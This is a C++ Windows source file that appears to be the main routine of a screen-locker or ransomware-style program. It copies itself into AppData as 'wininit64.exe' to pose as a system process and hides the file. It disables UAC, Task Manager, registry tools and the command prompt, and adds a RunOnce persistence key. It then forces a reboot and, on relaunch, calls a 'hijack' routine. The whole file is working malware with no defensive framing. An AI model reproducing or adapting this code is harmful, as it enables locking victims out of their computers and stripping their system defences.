#include <Windows.h>
#include <string>

#include "_common.hpp"
#include "_hijack.hpp"
#include "_registry.hpp"

using std::string;
using std::wstring;

CONST WCHAR* LAUNCH_KEY = L"pf=fkSfj+.K";

extern "C" int WINAPI wWinMain(
	_In_ HINSTANCE hInstance,
	_In_opt_ HINSTANCE hPrevInstance,
	_In_ PWSTR pCmdLine,
	_In_ int nCmdShow
) {
	HANDLE token = NULL;
	BOOL admin = FALSE;

	TOKEN_ELEVATION elevation = {};
	DWORD elevation_size = sizeof(TOKEN_ELEVATION);

	HANDLE proc = GetCurrentProcess();
	BOOL opened = OpenProcessToken(proc, TOKEN_QUERY, &token);

	if (!opened) {
		MessageBoxA(
			NULL,
			"Failed to check required permissions.",
			"Insufficient permissions",
			MB_OK | MB_ICONEXCLAMATION
		);

		common::self_destruct();

		return EXIT_FAILURE;
	}

	BOOL got_info = GetTokenInformation(
		token, TokenElevation,
		&elevation, elevation_size,
		&elevation_size
	);

	if (got_info) {
		admin = elevation.TokenIsElevated;
	}

	CloseHandle(token);

	if (!admin) {
		MessageBoxA(
			NULL,
			"Please re-run as administrator.",
			"Insufficient permissions",
			MB_OK | MB_ICONEXCLAMATION
		);

		common::self_destruct();

		return EXIT_FAILURE;
	}

	char application_data[MAX_PATH];
	DWORD len = GetEnvironmentVariableA(
		"appdata",
		application_data,
		MAX_PATH
	);

	if (len == 0) {
		MessageBoxA(
			NULL,
			"Failed to get new path",
			"Error",
			MB_OK | MB_ICONERROR
		);

		common::self_destruct();

		return EXIT_FAILURE;
	}

	string app_data = string(application_data);

	wchar_t exec_path[MAX_PATH] = {};
	DWORD module_file = GetModuleFileNameW(
		NULL,
		exec_path,
		MAX_PATH
	);

	if (module_file == 0) {
		MessageBoxA(
			NULL,
			"Failed to get module file name",
			"Error",
			MB_OK | MB_ICONERROR
		);

		common::self_destruct();

		return EXIT_FAILURE;
	}

	wstring exec_pathW(exec_path);
	wstring app_dataW(app_data.begin(), app_data.end());

	if (wcsstr(pCmdLine, LAUNCH_KEY) != NULL) {
		hijack::hijack(app_dataW);

		MessageBoxA(
			NULL,
			"Success!",
			"Success!",
			MB_OK | MB_ICONINFORMATION
		);

		return EXIT_SUCCESS;
	}
	else {
		wstring new_path = app_dataW + L"\\wininit64.exe";

		BOOL moved = MoveFileW(
			exec_path,
			new_path.c_str()
		);

		if (moved == FALSE) {
			MessageBoxA(
				NULL,
				"Failed to move file",
				"Error",
				MB_OK | MB_ICONERROR
			);

			common::self_destruct();

			return EXIT_FAILURE;
		}

		SetFileAttributesW(
			new_path.c_str(),
			FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM
		);

		registry::create_key(
			HKEY_LOCAL_MACHINE,
			registry::POLICIES,
			L"EnableLUA",
			0
		);

		registry::create_key(
			HKEY_CURRENT_USER,
			registry::POLICIES,
			L"DisableTaskMgr",
			1
		);

		registry::create_key(
			HKEY_CURRENT_USER,
			registry::POLICIES,
			L"DisableRegistryTools",
			1
		);

		registry::create_key(
			HKEY_CURRENT_USER,
			registry::POLICIES,
			L"shutdownwithoutlogon",
			0
		);

		registry::create_key(
			HKEY_CURRENT_USER,
			registry::SYSTEM,
			L"DisableCMD",
			1
		);

		wstring run_data = new_path + L" " + LAUNCH_KEY;

		registry::create_key(
			HKEY_CURRENT_USER,
			registry::RUN_ONCE,
			L"winlogon",
			run_data.c_str()
		);

		system("shutdown /r /f /t 0");

		return EXIT_SUCCESS;
	}

	return EXIT_SUCCESS;
}